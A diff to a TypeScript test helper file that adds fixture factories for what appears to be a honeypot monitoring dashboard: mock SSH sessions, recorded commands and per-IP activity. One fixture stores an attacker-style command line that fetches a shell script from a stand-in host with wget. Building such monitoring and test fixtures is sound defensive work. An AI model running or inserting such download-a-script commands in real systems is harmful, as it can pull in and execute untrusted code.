@@ -1,6 +1,19 @@
 import { vi } from "vitest";
 
-import type { Alert, AlertPage, EventPage, EventSummary, NormalizedEvent } from "../api/types";
+import type {
+  Alert,
+  AlertPage,
+  CommandPage,
+  CommandRecord,
+  EventPage,
+  EventSummary,
+  NormalizedEvent,
+  SessionPage,
+  SessionSummary,
+  SourceActivity,
+  SourceDetail,
+  SourcePage,
+} from "../api/types";
 
 export interface RecordedRequest {
   url: string;
@@ -118,11 +131,134 @@ export function makeSummary(overrides: Partial<EventSummary> = {}): EventSummary
   };
 }
 
+export function makeSession(overrides: Partial<SessionSummary> = {}): SessionSummary {
+  return {
+    session_id: "sess-1",
+    source_ip: "203.0.113.10",
+    first_seen: "2026-03-01T11:59:00Z",
+    last_seen: "2026-03-01T12:00:00Z",
+    duration_ms: 60_000,
+    event_count: 2,
+    command_count: 0,
+    usernames: ["root"],
+    protocols: ["ssh"],
+    has_authentication: true,
+    has_success: false,
+    ...overrides,
+  };
+}
+
+export function makeSessionPage(overrides: Partial<SessionPage> = {}): SessionPage {
+  return {
+    total: 2,
+    limit: 25,
+    offset: 0,
+    items: [
+      makeSession(),
+      makeSession({
+        session_id: "sess-2",
+        source_ip: "198.51.100.4",
+        last_seen: "2026-03-01T12:05:00Z",
+        duration_ms: 500,
+        command_count: 1,
+        usernames: ["oracle", "root"],
+        has_authentication: false,
+        has_success: true,
+      }),
+    ],
+    ...overrides,
+  };
+}
+
+export function makeCommand(overrides: Partial<CommandRecord> = {}): CommandRecord {
+  return {
+    event_id: "e-1",
+    event_type: "command.input",
+    occurred_at: "2026-03-01T12:01:00Z",
+    source_ip: "203.0.113.10",
+    session_id: "sess-1",
+    username: "root",
+    outcome: null,
+    command: "wget",
+    command_line: "wget http://example.com/x.sh",
+    ...overrides,
+  };
+}
+
+export function makeCommandPage(overrides: Partial<CommandPage> = {}): CommandPage {
+  return {
+    total: 2,
+    limit: 25,
+    offset: 0,
+    items: [
+      makeCommand(),
+      makeCommand({
+        event_id: "e-2",
+        event_type: "command.failed",
+        occurred_at: "2026-03-01T12:02:00Z",
+        outcome: "failure",
+        command: "totally-not-a-command",
+        command_line: "totally-not-a-command --now",
+      }),
+    ],
+    ...overrides,
+  };
+}
+
+export function makeSource(overrides: Partial<SourceActivity> = {}): SourceActivity {
+  return {
+    source_ip: "203.0.113.10",
+    event_count: 120,
+    session_count: 11,
+    auth_attempts: 80,
+    commands: 25,
+    transfers: 1,
+    failures: 90,
+    usernames: ["root", "admin"],
+    first_seen: "2026-03-01T00:00:00Z",
+    last_seen: "2026-03-01T23:59:59Z",
+    ...overrides,
+  };
+}
+
+export function makeSourcePage(overrides: Partial<SourcePage> = {}): SourcePage {
+  return {
+    total: 2,
+    limit: 25,
+    offset: 0,
+    items: [
+      makeSource(),
+      makeSource({
+        source_ip: "198.51.100.4",
+        event_count: 3,
+        session_count: 1,
+        auth_attempts: 0,
+        commands: 1,
+        transfers: 0,
+        failures: 1,
+        usernames: ["oracle"],
+        last_seen: "2026-03-01T12:05:00Z",
+      }),
+    ],
+    ...overrides,
+  };
+}
+
+export function makeSourceDetail(overrides: Partial<SourceDetail> = {}): SourceDetail {
+  return {
+    ...makeSource(),
+    by_category: [
+      { key: "authentication", count: 80 },
+      { key: "command", count: 25 },
+    ],
+    ...overrides,
+  };
+}
+
 /**
  * Replace `fetch` with a recording stub. `respond` maps the requested URL to
  * the JSON body the backend would answer.
- */
-export function mockBackend(
+ */export function mockBackend(
   respond: (url: URL) => { status?: number; body: unknown } | undefined,
 ): RecordedRequest[] {
   const calls: RecordedRequest[] = [];
